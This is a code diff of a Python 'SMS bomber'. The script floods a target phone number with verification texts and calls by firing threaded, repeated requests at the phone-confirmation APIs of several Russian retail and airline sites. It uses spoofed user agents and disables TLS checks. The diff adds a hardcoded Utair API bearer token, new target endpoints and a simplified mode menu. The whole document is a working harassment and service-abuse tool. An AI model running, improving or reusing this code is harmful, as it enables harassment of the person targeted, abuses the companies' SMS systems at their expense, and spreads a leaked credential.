@@ -2,45 +2,37 @@
 import requests
 import time
 import random
-import threading
+import urllib3
 from concurrent.futures import ThreadPoolExecutor
 from fake_useragent import UserAgent
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 ua = UserAgent()
 
-def generate_email():
-    templates = [
-        f'{random.randint(1,9999)}qwerty{random.randint(1,9999)}poplok{random.randint(1,9999)}',
-        f'asd{random.randint(1,9999)}vdiu{random.randint(1,9999)}gv{random.randint(1,9999)}uhn',
-        f'{random.randint(1,9999)}rftfg{random.randint(1,9999)}xcvm{random.randint(1,9999)}7pwgs'
-    ]
-    return f'{random.choice(templates)}@gmail.com'
+def formate_letu(phone):
+    if len(phone) == 11:
+        return f"+7 ({phone[1:4]}) {phone[4:7]}-{phone[7:9]}-{phone[9:]}"
+    return phone
 
 APIS = [
     {
         "name": "Letu (L'Occitane)", 
         "url": "https://www.letu.ru/s/api/user/account/v1/confirmations/phone",
         "pre_url": "https://www.letu.ru/",
-        "payload": {"phoneNumber": "+{phone}"}, "formate": False,
+        "payload": {"phoneNumber": "{phone_mask}"}, "formate": False,
         "origin": "https://www.letu.ru", "referer": "https://www.letu.ru/",
         "params": {"pushSite": "storeMobileRU"}
     },
     {
-        "name": "My.Telegram.org", 
-        "url": "https://my.telegram.org/auth/send_password",
-        "pre_url": "https://my.telegram.org/",
-        "payload": {"phone": "+{phone}"}, "formate": True,
-        "origin": "https://my.telegram.org", "referer": "https://my.telegram.org/"
-    },
-    {
-        "name": "Utair (Session)", 
-        "url": "https://b.utair.ru/api/v1/login/",
+        "name": "Utair (Mobile API)", 
+        "url": "https://www.utair.ru/mobile/api/v8/user/login",
         "pre_url": "https://www.utair.ru/",
-        "payload": {"login": "{phone}", "confirmation_type": "standart"}, "formate": True,
-        "origin": "https://www.utair.ru", "referer": "https://www.utair.ru/"
+        "payload": {"login": "{phone}", "confirmationType": "callCode"}, "formate": False,
+        "origin": "https://www.utair.ru", "referer": "https://www.utair.ru/",
+        "headers": {"Authorization": "Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1NjkzIiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmltZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyJdLCJleHAiOjE2NDExODIzNDh9.crO5rLAZ1btPDgplxCVPjx9NtO_nHB7I83Gyf1QYeGE"}
     },
     {
-        "name": "TortoMaster (Call)", 
+        "name": "TortoMaster (SMS)", 
         "url": "https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php",
         "pre_url": "https://kaliningrad.tortomaster.ru/personal/?register=yes",
         "payload": {"REGISTER[PHONE_NUMBER]": "{phone}", "send_sms": "Y", "agree": "Y"}, "formate": True,
@@ -54,11 +46,11 @@ APIS = [
         "origin": "https://vtk-moscow.ru", "referer": "https://vtk-moscow.ru/"
     },
     {
-        "name": "Azbuka-Severa (Call)", 
-        "url": "https://azbuka-severa.ru/local/ajax/get_phone_code.php",
-        "pre_url": "https://azbuka-severa.ru/",
-        "payload": {"PHONE": "{phone}"}, "formate": True,
-        "origin": "https://azbuka-severa.ru", "referer": "https://azbuka-severa.ru/"
+        "name": "TortoMaster (Call)", 
+        "url": "https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php",
+        "pre_url": "https://kaliningrad.tortomaster.ru/personal/?register=yes",
+        "payload": {"REGISTER[PHONE_NUMBER]": "{phone}", "send_sms": "N", "agree": "Y"}, "formate": True,
+        "origin": "https://kaliningrad.tortomaster.ru", "referer": "https://kaliningrad.tortomaster.ru/personal/?register=yes"
     }
 ]
 
@@ -71,6 +63,9 @@ def send_request(api, phone):
             "Origin": api.get("origin", ""),
             "Referer": api.get("referer", "")
         }
+        if "headers" in api:
+            headers.update(api["headers"])
+            
         session.headers.update(headers)
 
         if api.get("pre_url"):
@@ -78,7 +73,10 @@ def send_request(api, phone):
 
         payload = {}
         for k, v in api["payload"].items():
-            payload[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
+            if isinstance(v, str):
+                payload[k] = v.replace("{phone}", phone).replace("{phone_mask}", formate_letu(phone))
+            else:
+                payload[k] = v
 
         if api.get("formate"):
             r = session.post(api["url"], data=payload, params=api.get("params"), timeout=10, verify=False)
@@ -98,9 +96,7 @@ def run_mode(mode, phone, cycles):
         target_apis = [a for a in APIS if "Call" not in a["name"]]
     elif mode == "2":
         target_apis = [a for a in APIS if "Call" in a["name"]]
-    elif mode == "3":
-        target_apis = APIS
-    elif mode == "4":
+    else:
         target_apis = APIS
 
     print(f"\n[*] Starting mode {mode} for {phone}")
@@ -108,7 +104,7 @@ def run_mode(mode, phone, cycles):
 
     for i in range(cycles):
         print(f"--- Cycle {i+1} ---")
-        with ThreadPoolExecutor(max_workers=10) as executor:
+        with ThreadPoolExecutor(max_workers=len(target_apis)) as executor:
             for api in target_apis:
                 executor.submit(send_request, api, phone)
         time.sleep(3)
@@ -121,41 +117,17 @@ def main():
     ██╔══██║██╔══╝  ██║     ██║     ██╔══╝  ██║██╔══██╗██╔══╝  
     ██║  ██║███████╗███████╗███████╗██║     ██║██║  ██║███████╗
     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
-    [ SMS API Tester / Bomber ]
     """
     print(ascii_art)
-    print("Select mode:")
-    print("  1. SMS")
-    print("  2. CALL")
-    print("  3. Mixer")
-    print("  4. H3ll1sh")
-    print("  0. Exit\n")
-    
-    mode = input("> ")
-    if mode == "0":
-        return
-        
-    if mode not in ["1", "2", "3", "4"]:
-        print("Invalid mode!")
-        return
-
-    phone = input("Enter phone number (example: 79991234567): ").strip()
+    mode = input("Select mode (1: SMS, 2: CALL, 3: ALL) > ")
+    phone = input("Enter phone (example: 79991234567): ").strip()
     phone = "".join(filter(str.isdigit, phone))
-    
-    if len(phone) != 11:
-        print("[!] Phone number must have 11 digits!")
-        return
-
-    try:
-        cycles = int(input("Enter cycles: "))
-    except ValueError:
-        print("[!] Please enter a valid number!")
-        return
+    cycles = int(input("Enter cycles: "))
 
     try:
         run_mode(mode, phone, cycles)
     except KeyboardInterrupt:
-        print("\n[*] Stopped by user.")
+        print("\n[*] Stopped.")
 
 if __name__ == "__main__":
     main()
